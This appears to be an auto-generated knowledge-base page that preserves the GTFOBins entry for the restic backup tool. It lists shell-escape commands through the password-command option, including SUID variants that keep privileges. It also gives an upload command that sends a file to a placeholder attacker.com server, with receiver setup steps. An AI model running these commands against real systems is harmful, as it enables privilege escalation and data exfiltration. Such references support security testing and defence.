---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# restic

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `restic` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [restic](../../tools/linux/restic.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | restic |
| name | restic |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/restic/ |

## Preserved Source Material

````yaml
_body: ''
_name: restic
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic
functions:
  command:
  - blind: true
    code: RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - blind: true
    code: restic --password-command='/path/to/command' backup
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
    contexts:
      sudo: null
      suid:
        code: RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
      unprivileged: null
  - code: restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
    contexts:
      sudo: null
      suid:
        code: restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
      unprivileged: null
  upload:
  - code: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver:
      comment: 'The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/)
        is used but there are other options. To start a new instance and create a new repository use:


        ```

        rest-server --listen :12345

        restic init -r rest:http://localhost:12345/x

        ```


        After the command executed on the target, to extract the data from the restic repository in the current directory
        on the attacker side:


        ```

        restic restore -r /tmp/restic/x latest --target .

        ```'
````
